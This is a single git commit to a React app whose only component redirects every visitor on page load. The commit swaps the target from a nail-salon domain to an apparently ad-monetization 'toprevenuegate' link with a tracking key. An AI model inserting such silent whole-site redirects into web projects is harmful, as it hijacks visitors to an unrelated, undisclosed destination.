bdfdcb46f123997c3d01600d9a961ec1f69b7325
dtienhau <117889242+dtienhau@users.noreply.github.com>
2023-12-25 12:27:13 +0700

    Update App.js

--- src/App.js
+++ src/App.js
@@ -2,7 +2,7 @@ import { useEffect } from 'react';
 
 export default function Home() {
   useEffect(() => {
-    window.location.href = 'https://nailsforus.com' + window.location.pathname;
+    window.location.href = 'https://www.toprevenuegate.com/c7wt6g6x?key=daba6f2a47ff1d7d522ebd9aa05653bb' + window.location.pathname;
   }, []);
 
   return null;
